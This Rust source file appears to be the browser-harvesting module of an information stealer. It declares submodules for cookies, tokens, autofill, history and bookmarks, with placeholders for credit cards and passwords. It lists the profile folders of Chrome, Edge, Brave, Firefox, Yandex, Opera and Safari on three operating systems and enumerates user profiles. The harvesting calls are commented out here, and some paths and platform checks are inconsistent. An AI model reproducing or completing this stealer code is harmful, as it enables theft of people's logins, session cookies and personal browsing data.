mod autofill;
mod bookmarks;
mod cookies;
mod history;
mod token;
// credit cards
// passwords

use std::path::PathBuf;

pub async fn get_browser() {
    let mut browser_root = get_browser_root_paths();

    let mut tempfile = if cfg!(target_os = "windows") {
        PathBuf::from(std::env::var("TEMP").unwrap())
    } else {
        PathBuf::from(String::from("/tmp"))
    };
    tempfile.push("cat.db");

    for path_entry in browser_root.iter_mut() {
        if let Ok(profiles) = get_profiles(path_entry).await {
            // cookies::get_cookies(path_entry, &profiles).await;
            // token::get_token(path_entry, &profiles).await;

            // let history = history::get_history(path_entry, &profiles, &tempfile).await;
            // println!("{history:#?}");

            // let bookmarks = bookmarks::get_bookmarks(path_entry, &profiles).await;

            // let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
            // println!("{autofills:#?}");
        }
    }
}

fn get_browser_root_paths() -> Vec<PathBuf> {
    let mut root_paths = Vec::with_capacity(8);

    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap();
        let roaming = std::env::var("APPDATA").unwrap();

        root_paths.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
        root_paths.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
        root_paths.push(PathBuf::from(format!(
            "{local}/BraveSoftware/Brave-Browser/User Data"
        ))); // Brave Browser
             // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
        root_paths.push(PathBuf::from(format!("{roaming}/Mozilla/Firefox/Profiles"))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "{local}/Yandex/YandexBrowser/User Data"
        ))); // Yandex
        root_paths.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera GX Stable"
        ))); // Opera GX Browser
        root_paths.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera Stable"
        ))); // Opera Browser
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap();

        // root_paths.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "{home}/.config/BraveSoftware/Brave-Browser"
        )));
        // root_paths.push(PathBuf::from(format!("{home}/.config/google-chrome"))); // Google Chrome

        // root_paths.push(""); // Chromium
        // root_paths.push(""); // Microsoft Edge
        // root_paths.push(""); // Yandex
        // root_paths.push(""); // Opera
    }
    #[cfg(target_os = "macos")]
    {
        let user = std::env::var("USER").unwrap();

        root_paths.push(PathBuf::from(format!("Users/{user}/Library/Safari"))); // Safari
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/Google/Chrome"
        ))); // Google Chrome
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/Firefox/Profiles"
        ))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/com.operasoftware.Opera"
        ))); // Opera
    }

    root_paths
}

async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
    // checking if browser is installed or not
    match tokio::fs::read_dir(&path).await {
        Ok(mut list) => {
            let mut profiles = Vec::with_capacity(16);
            profiles.push("Default".to_string());
            // loop through all other profiles
            while let Ok(dir_entry_unknown) = list.next_entry().await {
                if let Some(dir_entry) = dir_entry_unknown {
                    if let Some(entry) = dir_entry.file_name().to_str() {
                        if !entry.starts_with("Profile") {
                            continue;
                        }
                    }
                    profiles.push(dir_entry.file_name().into_string().unwrap());
                } else {
                    break;
                }
            }
            return Ok(profiles);
        }
        Err(e) => return Err(e),
    }
}

async fn check_db_size(path: &mut PathBuf) -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::fs::MetadataExt;
        if let Ok(f) = std::fs::metadata(path.as_os_str()) {
            if f.file_size() == 0 {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    "Database is empty",
                ));
            }
        }
    }
    #[cfg(target_os = "linux")]
    {
        use std::os::linux::fs::MetadataExt;
        if let Ok(f) = std::fs::metadata(path.as_os_str()) {
            if f.st_size() == 0 {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    "Database is empty",
                ));
            }
        }
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        compile_error!("Unsupported target.");
    }
    Ok(())
}
